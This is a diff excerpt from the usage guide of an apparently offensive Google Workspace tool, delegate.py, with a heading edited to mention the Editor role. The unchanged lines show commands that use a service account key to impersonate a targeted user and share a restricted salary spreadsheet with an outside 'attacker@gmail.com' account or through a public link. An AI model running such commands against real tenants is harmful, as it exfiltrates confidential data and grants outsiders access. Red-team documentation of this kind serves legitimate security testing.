@@ -67,7 +67,7 @@ Modify permissions on specific file or folder (Add external Gmail account with E
 python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -f Restricted_documents -t Salary2023.xlsx -e attacker@gmail.com
 ```
 
-Create shared link on specific file or folder for access
+Create shared link on specific file or folder for access with Editor role
 ```
 python3 delegate.py -k ../sa_key.json -i targeted.delegated@mackinsoncloud.com -m drive -f Restricted_documents -t Salary2023.xlsx -l
 ```
